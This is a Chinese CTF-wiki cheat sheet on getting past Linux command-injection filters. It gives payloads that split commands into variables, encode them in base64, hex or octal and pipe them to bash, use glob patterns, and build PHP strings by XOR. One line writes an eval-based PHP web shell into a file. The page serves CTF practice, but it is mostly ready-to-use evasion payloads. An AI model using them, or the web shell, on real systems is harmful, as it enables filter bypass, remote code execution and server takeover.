# linux绕过姿势
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/).



拼接绕过


```plain
#执行ls命令：
a=l;b=s;$a$b
#cat flag文件内容：
a=c;b=at;c=f;d=lag;$a$b${c}${d}
#cat test文件内容
a="ccaatt";b=${a:0:1}${a:2:1}${a:4:1};$btest
Plain Text
```



编码绕过








```plain
#base64
echo "Y2F0IC9mbGFn"|base64 -d|bash ==>cat /flag
echo Y2F0IC9mbGFn|base64 -d|sh==>cat /flag
#hex
echo "0x636174202f666c6167" | xxd -r -p|bash ==>cat /flag
#oct/字节
$(printf "\154\163") ==>ls
$(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67") ==>cat /flag
{printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"}|\$0 ==>cat /flag
也可以通过这种方式写马
内容为php @eval($_POST['c']);?>
${printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"} >> 1.php。

Plain Text
```



正则匹配


```plain
cat t?st
cat te*
cat t[a-z]st
cat t{a,b,c,d,e,f}st
Plain Text
```



异或绕过（linux可以这么用，但这里应该不是linux）


```plain
var_dump('#'^'|'); //得到字符 _
var_dump('.'^'~'); //得到字符 P
var_dump('/'^'`'); //得到字符 0
var_dump('|'^'/'); //得到字符 S
var_dump('{'^'/'); //得到字符 T
$__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/"); //变量$__值为字符串'_POST'
Plain Text
```



```plain
#给出脚本if __name__ == "__main__":
for i in range(0,127):
for j in range(0,127):
result=i^j
if(chr(result) is '想要的字符'):
print(' '+chr(i)+' xor '+chr(j)+' == '+chr(result))缩进自己来
Plain Text
```





